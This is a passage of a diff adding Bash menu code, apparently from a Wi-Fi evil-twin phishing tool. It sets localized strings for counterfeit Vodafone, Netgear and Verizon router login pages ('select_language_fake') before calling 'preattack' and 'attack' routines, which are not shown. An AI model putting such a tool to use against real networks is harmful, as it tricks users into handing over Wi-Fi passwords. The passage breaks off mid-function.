+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_VODAFONE_FR5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_VODAFONE_FR6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_VODAFONE_FR7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_VODAFONE_FR8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_VODAFONE_FR9
+				DIALOG_WEB_INDEX_10=$DIALOG_WEB_INDEX_VODAFONE_FR10
+				DIALOG_WEB_INDEX_11=$DIALOG_WEB_INDEX_VODAFONE_FR11
+				DIALOG_WEB_INDEX_12=$DIALOG_WEB_INDEX_VODAFONE_FR12
+				DIALOG_WEB_INDEX_13=$DIALOG_WEB_INDEX_VODAFONE_FR13
+				DIALOG_WEB_INDEX_14=$DIALOG_WEB_INDEX_VODAFONE_FR14
+				DIALOG_WEB_INDEX_15=$DIALOG_WEB_INDEX_VODAFONE_FR15
+				DIALOG_WEB_INDEX_16=$DIALOG_WEB_INDEX_VODAFONE_FR16
+				DIALOG_WEB_INDEX_17=$DIALOG_WEB_INDEX_VODAFONE_FR17
+				DIALOG_WEB_INDEX_18=$DIALOG_WEB_INDEX_VODAFONE_FR18
+				DIALOG_WEB_INDEX_19=$DIALOG_WEB_INDEX_VODAFONE_FR19
+				DIALOG_WEB_INDEX_20=$DIALOG_WEB_INDEX_VODAFONE_FR20
+				DIALOG_WEB_INDEX_21=$DIALOG_WEB_INDEX_VODAFONE_FR21
+				DIALOG_WEB_INDEX_22=$DIALOG_WEB_INDEX_VODAFONE_FR22
+				VODAFONE
+				break
+			elif [ "$linea" = "5" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_POR
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_POR
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_POR
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_POR
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_POR
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_POR
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_POR
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_POR
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_VODAFONE_POR1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_VODAFONE_POR2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_VODAFONE_POR3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_VODAFONE_POR4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_VODAFONE_POR5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_VODAFONE_POR6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_VODAFONE_POR7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_VODAFONE_POR8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_VODAFONE_POR9
+				DIALOG_WEB_INDEX_10=$DIALOG_WEB_INDEX_VODAFONE_POR10
+				DIALOG_WEB_INDEX_11=$DIALOG_WEB_INDEX_VODAFONE_POR11
+				DIALOG_WEB_INDEX_12=$DIALOG_WEB_INDEX_VODAFONE_POR12
+				DIALOG_WEB_INDEX_13=$DIALOG_WEB_INDEX_VODAFONE_POR13
+				DIALOG_WEB_INDEX_14=$DIALOG_WEB_INDEX_VODAFONE_POR14
+				DIALOG_WEB_INDEX_15=$DIALOG_WEB_INDEX_VODAFONE_POR15
+				DIALOG_WEB_INDEX_16=$DIALOG_WEB_INDEX_VODAFONE_POR16
+				DIALOG_WEB_INDEX_17=$DIALOG_WEB_INDEX_VODAFONE_POR17
+				DIALOG_WEB_INDEX_18=$DIALOG_WEB_INDEX_VODAFONE_POR18
+				DIALOG_WEB_INDEX_19=$DIALOG_WEB_INDEX_VODAFONE_POR19
+				DIALOG_WEB_INDEX_20=$DIALOG_WEB_INDEX_VODAFONE_POR20
+				DIALOG_WEB_INDEX_21=$DIALOG_WEB_INDEX_VODAFONE_POR21
+				DIALOG_WEB_INDEX_22=$DIALOG_WEB_INDEX_VODAFONE_POR22
+				VODAFONE
+				break
+			elif [ "$linea" = "6" ]; then
+				continue
+			fi
+		fi
+	
+	done
+	preattack
+	attack
+}
+
+
+function NETGEAR1 {
+	while true; do
+		conditional_clear
+		top
+		
+		infoap
+		echo
+		echo "$header_ConnectionRESET"
+		echo
+		
+		echo -e "$verde""1)"$rescolor" Interface NETGEAR"
+		echo -e "$verde""2)"$rescolor" \e[1;31mSalir"$rescolor""
+		
+		echo
+		echo -n "#? "
+		read line
+		
+		if [ "$line" = "2" ]; then
+			web-pages
+		elif [ "$line" = "1" ]; then
+			conditional_clear
+			top
+			
+			infoap
+			echo
+			echo "$select_language_fake"
+			echo
+			
+			echo -e "$verde""1)"$rescolor" English     [ENG]"
+			echo -e "$verde""2)"$rescolor" Spanish     [ESP]"
+			echo -e "$verde""3)"$rescolor" Italy       [IT]"
+			echo -e "$verde""4)"$rescolor" French      [FR]"
+			echo -e "$verde""5)"$rescolor" Portuguese  [POR]"
+			echo -e "$verde""6)"$rescolor" \e[1;31mAtras"$rescolor""
+			
+			echo
+			echo -n "#? "
+			read linea
+			language=${webinterfaceslenguage[$line]}
+			
+			if [ "$linea" = "1" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ENG
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ENG
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ENG
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_ENG
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ENG
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ENG
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ENG
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ENG
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_NETGEAR_ENG1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_NETGEAR_ENG2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_NETGEAR_ENG3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_NETGEAR_ENG4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_NETGEAR_ENG5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_NETGEAR_ENG6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_NETGEAR_ENG7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_NETGEAR_ENG8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_NETGEAR_ENG9
+				DIALOG_WEB_INDEX_10=$DIALOG_WEB_INDEX_NETGEAR_ENG10
+				DIALOG_WEB_INDEX_11=$DIALOG_WEB_INDEX_NETGEAR_ENG11
+				DIALOG_WEB_INDEX_12=$DIALOG_WEB_INDEX_NETGEAR_ENG12
+				DIALOG_WEB_INDEX_13=$DIALOG_WEB_INDEX_NETGEAR_ENG13
+				DIALOG_WEB_INDEX_14=$DIALOG_WEB_INDEX_NETGEAR_ENG14
+				DIALOG_WEB_INDEX_15=$DIALOG_WEB_INDEX_NETGEAR_ENG15
+				DIALOG_WEB_INDEX_16=$DIALOG_WEB_INDEX_NETGEAR_ENG16
+				DIALOG_WEB_INDEX_17=$DIALOG_WEB_INDEX_NETGEAR_ENG17
+				DIALOG_WEB_INDEX_18=$DIALOG_WEB_INDEX_NETGEAR_ENG18
+				DIALOG_WEB_INDEX_19=$DIALOG_WEB_INDEX_NETGEAR_ENG19
+				DIALOG_WEB_INDEX_20=$DIALOG_WEB_INDEX_NETGEAR_ENG20
+				DIALOG_WEB_INDEX_21=$DIALOG_WEB_INDEX_NETGEAR_ENG21
+				DIALOG_WEB_INDEX_22=$DIALOG_WEB_INDEX_NETGEAR_ENG22
+				DIALOG_WEB_INDEX_23=$DIALOG_WEB_INDEX_NETGEAR_ENG23
+				DIALOG_WEB_INDEX_24=$DIALOG_WEB_INDEX_NETGEAR_ENG24
+				NETGEAR 
+				break
+			elif [ "$linea" = "2" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ESP
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ESP
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ESP
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_ESP
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ESP
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ESP
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ESP
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ESP
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_NETGEAR_ESP1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_NETGEAR_ESP2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_NETGEAR_ESP3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_NETGEAR_ESP4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_NETGEAR_ESP5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_NETGEAR_ESP6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_NETGEAR_ESP7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_NETGEAR_ESP8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_NETGEAR_ESP9
+				DIALOG_WEB_INDEX_10=$DIALOG_WEB_INDEX_NETGEAR_ESP10
+				DIALOG_WEB_INDEX_11=$DIALOG_WEB_INDEX_NETGEAR_ESP11
+				DIALOG_WEB_INDEX_12=$DIALOG_WEB_INDEX_NETGEAR_ESP12
+				DIALOG_WEB_INDEX_13=$DIALOG_WEB_INDEX_NETGEAR_ESP13
+				DIALOG_WEB_INDEX_14=$DIALOG_WEB_INDEX_NETGEAR_ESP14
+				DIALOG_WEB_INDEX_15=$DIALOG_WEB_INDEX_NETGEAR_ESP15
+				DIALOG_WEB_INDEX_16=$DIALOG_WEB_INDEX_NETGEAR_ESP16
+				DIALOG_WEB_INDEX_17=$DIALOG_WEB_INDEX_NETGEAR_ESP17
+				DIALOG_WEB_INDEX_18=$DIALOG_WEB_INDEX_NETGEAR_ESP18
+				DIALOG_WEB_INDEX_19=$DIALOG_WEB_INDEX_NETGEAR_ESP19
+				DIALOG_WEB_INDEX_20=$DIALOG_WEB_INDEX_NETGEAR_ESP20
+				DIALOG_WEB_INDEX_21=$DIALOG_WEB_INDEX_NETGEAR_ESP21
+				DIALOG_WEB_INDEX_22=$DIALOG_WEB_INDEX_NETGEAR_ESP22
+				DIALOG_WEB_INDEX_23=$DIALOG_WEB_INDEX_NETGEAR_ESP23
+				DIALOG_WEB_INDEX_24=$DIALOG_WEB_INDEX_NETGEAR_ESP24
+				NETGEAR
+				break
+			elif [ "$linea" = "3" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_IT
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_IT
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_IT
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_IT
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_IT
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_IT
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_IT
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_IT
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_NETGEAR_IT1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_NETGEAR_IT2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_NETGEAR_IT3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_NETGEAR_IT4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_NETGEAR_IT5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_NETGEAR_IT6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_NETGEAR_IT7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_NETGEAR_IT8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_NETGEAR_IT9
+				DIALOG_WEB_INDEX_10=$DIALOG_WEB_INDEX_NETGEAR_IT10
+				DIALOG_WEB_INDEX_11=$DIALOG_WEB_INDEX_NETGEAR_IT11
+				DIALOG_WEB_INDEX_12=$DIALOG_WEB_INDEX_NETGEAR_IT12
+				DIALOG_WEB_INDEX_13=$DIALOG_WEB_INDEX_NETGEAR_IT13
+				DIALOG_WEB_INDEX_14=$DIALOG_WEB_INDEX_NETGEAR_IT14
+				DIALOG_WEB_INDEX_15=$DIALOG_WEB_INDEX_NETGEAR_IT15
+				DIALOG_WEB_INDEX_16=$DIALOG_WEB_INDEX_NETGEAR_IT16
+				DIALOG_WEB_INDEX_17=$DIALOG_WEB_INDEX_NETGEAR_IT17
+				DIALOG_WEB_INDEX_18=$DIALOG_WEB_INDEX_NETGEAR_IT18
+				DIALOG_WEB_INDEX_19=$DIALOG_WEB_INDEX_NETGEAR_IT19
+				DIALOG_WEB_INDEX_20=$DIALOG_WEB_INDEX_NETGEAR_IT20
+				DIALOG_WEB_INDEX_21=$DIALOG_WEB_INDEX_NETGEAR_IT21
+				DIALOG_WEB_INDEX_22=$DIALOG_WEB_INDEX_NETGEAR_IT22
+				DIALOG_WEB_INDEX_23=$DIALOG_WEB_INDEX_NETGEAR_IT23
+				DIALOG_WEB_INDEX_24=$DIALOG_WEB_INDEX_NETGEAR_IT24
+				NETGEAR
+				break
+			elif [ "$linea" = "4" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_FR
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_FR
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_FR
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_FR
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_FR
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_FR
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_FR
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_FR
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_NETGEAR_FR1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_NETGEAR_FR2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_NETGEAR_FR3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_NETGEAR_FR4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_NETGEAR_FR5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_NETGEAR_FR6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_NETGEAR_FR7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_NETGEAR_FR8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_NETGEAR_FR9
+				DIALOG_WEB_INDEX_10=$DIALOG_WEB_INDEX_NETGEAR_FR10
+				DIALOG_WEB_INDEX_11=$DIALOG_WEB_INDEX_NETGEAR_FR11
+				DIALOG_WEB_INDEX_12=$DIALOG_WEB_INDEX_NETGEAR_FR12
+				DIALOG_WEB_INDEX_13=$DIALOG_WEB_INDEX_NETGEAR_FR13
+				DIALOG_WEB_INDEX_14=$DIALOG_WEB_INDEX_NETGEAR_FR14
+				DIALOG_WEB_INDEX_15=$DIALOG_WEB_INDEX_NETGEAR_FR15
+				DIALOG_WEB_INDEX_16=$DIALOG_WEB_INDEX_NETGEAR_FR16
+				DIALOG_WEB_INDEX_17=$DIALOG_WEB_INDEX_NETGEAR_FR17
+				DIALOG_WEB_INDEX_18=$DIALOG_WEB_INDEX_NETGEAR_FR18
+				DIALOG_WEB_INDEX_19=$DIALOG_WEB_INDEX_NETGEAR_FR19
+				DIALOG_WEB_INDEX_20=$DIALOG_WEB_INDEX_NETGEAR_FR20
+				DIALOG_WEB_INDEX_21=$DIALOG_WEB_INDEX_NETGEAR_FR21
+				DIALOG_WEB_INDEX_22=$DIALOG_WEB_INDEX_NETGEAR_FR22
+				DIALOG_WEB_INDEX_23=$DIALOG_WEB_INDEX_NETGEAR_FR23
+				DIALOG_WEB_INDEX_24=$DIALOG_WEB_INDEX_NETGEAR_FR24
+				NETGEAR
+				break
+			elif [ "$linea" = "5" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_POR
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_POR
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_POR
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_POR
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_POR
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_POR
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_POR
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_POR
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_NETGEAR_POR1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_NETGEAR_POR2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_NETGEAR_POR3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_NETGEAR_POR4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_NETGEAR_POR5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_NETGEAR_POR6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_NETGEAR_POR7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_NETGEAR_POR8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_NETGEAR_POR9
+				DIALOG_WEB_INDEX_10=$DIALOG_WEB_INDEX_NETGEAR_POR10
+				DIALOG_WEB_INDEX_11=$DIALOG_WEB_INDEX_NETGEAR_POR11
+				DIALOG_WEB_INDEX_12=$DIALOG_WEB_INDEX_NETGEAR_POR12
+				DIALOG_WEB_INDEX_13=$DIALOG_WEB_INDEX_NETGEAR_POR13
+				DIALOG_WEB_INDEX_14=$DIALOG_WEB_INDEX_NETGEAR_POR14
+				DIALOG_WEB_INDEX_15=$DIALOG_WEB_INDEX_NETGEAR_POR15
+				DIALOG_WEB_INDEX_16=$DIALOG_WEB_INDEX_NETGEAR_POR16
+				DIALOG_WEB_INDEX_17=$DIALOG_WEB_INDEX_NETGEAR_POR17
+				DIALOG_WEB_INDEX_18=$DIALOG_WEB_INDEX_NETGEAR_POR18
+				DIALOG_WEB_INDEX_19=$DIALOG_WEB_INDEX_NETGEAR_POR19
+				DIALOG_WEB_INDEX_20=$DIALOG_WEB_INDEX_NETGEAR_POR20
+				DIALOG_WEB_INDEX_21=$DIALOG_WEB_INDEX_NETGEAR_POR21
+				DIALOG_WEB_INDEX_22=$DIALOG_WEB_INDEX_NETGEAR_POR22
+				DIALOG_WEB_INDEX_23=$DIALOG_WEB_INDEX_NETGEAR_POR23
+				DIALOG_WEB_INDEX_24=$DIALOG_WEB_INDEX_NETGEAR_POR24
+				NETGEAR
+				break
+			elif [ "$linea" = "6" ]; then
+				continue
+			fi
+		fi
+	
+	done
+	preattack
+	attack
+}
+
+function VERIZON1 {
+	while true; do
+		conditional_clear
+		top
+		
+		infoap
+		echo
+		echo "$header_ConnectionRESET"
+		echo
+		
+		echo -e "$verde""1)"$rescolor" Interface VERIZON"
+		echo -e "$verde""2)"$rescolor" \e[1;31mSalir"$rescolor""
+		
+		echo
+		echo -n "#? "
+		read line
+		
+		if [ "$line" = "2" ]; then
+			web-pages
+		elif [ "$line" = "1" ]; then
+			conditional_clear
+			top
+			
+			infoap
+			echo
+			echo "$select_language_fake"
+			echo
+			
+			echo -e "$verde""1)"$rescolor" English     [ENG]"
+			echo -e "$verde""2)"$rescolor" Spanish     [ESP]"
+			echo -e "$verde""3)"$rescolor" Italy       [IT]"
+			echo -e "$verde""4)"$rescolor" French      [FR]"
+			echo -e "$verde""5)"$rescolor" Portuguese  [POR]"
+			echo -e "$verde""6)"$rescolor" \e[1;31mAtras"$rescolor""
+			
+			echo
+			echo -n "#? "
+			read linea
+			language=${webinterfaceslenguage[$line]}
+			
+			if [ "$linea" = "1" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ENG
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ENG
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ENG
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_ENG
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ENG
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ENG
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ENG
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ENG
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_VERIZON_ENG1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_VERIZON_ENG2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_VERIZON_ENG3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_VERIZON_ENG4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_VERIZON_ENG5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_VERIZON_ENG6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_VERIZON_ENG7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_VERIZON_ENG8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_VERIZON_ENG9
+				DIALOG_WEB_INDEX_10=$DIALOG_WEB_INDEX_VERIZON_ENG10
+				DIALOG_WEB_INDEX_11=$DIALOG_WEB_INDEX_VERIZON_ENG11
+				DIALOG_WEB_INDEX_12=$DIALOG_WEB_INDEX_VERIZON_ENG12
+				DIALOG_WEB_INDEX_13=$DIALOG_WEB_INDEX_VERIZON_ENG13
+				DIALOG_WEB_INDEX_14=$DIALOG_WEB_INDEX_VERIZON_ENG14
+				DIALOG_WEB_INDEX_15=$DIALOG_WEB_INDEX_VERIZON_ENG15
+				DIALOG_WEB_INDEX_16=$DIALOG_WEB_INDEX_VERIZON_ENG16
+				DIALOG_WEB_INDEX_17=$DIALOG_WEB_INDEX_VERIZON_ENG17
+				VERIZON 
+				break
+			elif [ "$linea" = "2" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ESP
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ESP
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ESP
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_ESP
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ESP
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ESP
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ESP
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ESP
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_VERIZON_ESP1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_VERIZON_ESP2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_VERIZON_ESP3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_VERIZON_ESP4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_VERIZON_ESP5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_VERIZON_ESP6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_VERIZON_ESP7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_VERIZON_ESP8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_VERIZON_ESP9
+				DIALOG_WEB_INDEX_10=$DIALOG_WEB_INDEX_VERIZON_ESP10
+				DIALOG_WEB_INDEX_11=$DIALOG_WEB_INDEX_VERIZON_ESP11
+				DIALOG_WEB_INDEX_12=$DIALOG_WEB_INDEX_VERIZON_ESP12
+				DIALOG_WEB_INDEX_13=$DIALOG_WEB_INDEX_VERIZON_ESP13
+				DIALOG_WEB_INDEX_14=$DIALOG_WEB_INDEX_VERIZON_ESP14
+				DIALOG_WEB_INDEX_15=$DIALOG_WEB_INDEX_VERIZON_ESP15
+				DIALOG_WEB_INDEX_16=$DIALOG_WEB_INDEX_VERIZON_ESP16
+				DIALOG_WEB_INDEX_17=$DIALOG_WEB_INDEX_VERIZON_ESP17
+				VERIZON
+				break
+			elif [ "$linea" = "3" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_IT
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_IT
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_IT
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_IT
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_IT
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_IT
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_IT
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_IT
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_VERIZON_IT1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_VERIZON_IT2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_VERIZON_IT3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_VERIZON_IT4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_VERIZON_IT5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_VERIZON_IT6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_VERIZON_IT7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_VERIZON_IT8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_VERIZON_IT9
+				DIALOG_WEB_INDEX_10=$DIALOG_WEB_INDEX_VERIZON_IT10
+				DIALOG_WEB_INDEX_11=$DIALOG_WEB_INDEX_VERIZON_IT11
+				DIALOG_WEB_INDEX_12=$DIALOG_WEB_INDEX_VERIZON_IT12
+				DIALOG_WEB_INDEX_13=$DIALOG_WEB_INDEX_VERIZON_IT13
+				DIALOG_WEB_INDEX_14=$DIALOG_WEB_INDEX_VERIZON_IT14
+				DIALOG_WEB_INDEX_15=$DIALOG_WEB_INDEX_VERIZON_IT15
+				DIALOG_WEB_INDEX_16=$DIALOG_WEB_INDEX_VERIZON_IT16
+				DIALOG_WEB_INDEX_17=$DIALOG_WEB_INDEX_VERIZON_IT17
+				VERIZON
+				break
+			elif [ "$linea" = "4" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_FR
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_FR
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_FR
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_FR
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_FR
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_FR
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_FR
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_FR
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_VERIZON_FR1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_VERIZON_FR2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_VERIZON_FR3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_VERIZON_FR4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_VERIZON_FR5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_VERIZON_FR6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_VERIZON_FR7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_VERIZON_FR8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_VERIZON_FR9
+				DIALOG_WEB_INDEX_10=$DIALOG_WEB_INDEX_VERIZON_FR10
+				DIALOG_WEB_INDEX_11=$DIALOG_WEB_INDEX_VERIZON_FR11
+				DIALOG_WEB_INDEX_12=$DIALOG_WEB_INDEX_VERIZON_FR12
+				DIALOG_WEB_INDEX_13=$DIALOG_WEB_INDEX_VERIZON_FR13
+				DIALOG_WEB_INDEX_14=$DIALOG_WEB_INDEX_VERIZON_FR14
+				DIALOG_WEB_INDEX_15=$DIALOG_WEB_INDEX_VERIZON_FR15
+				DIALOG_WEB_INDEX_16=$DIALOG_WEB_INDEX_VERIZON_FR16
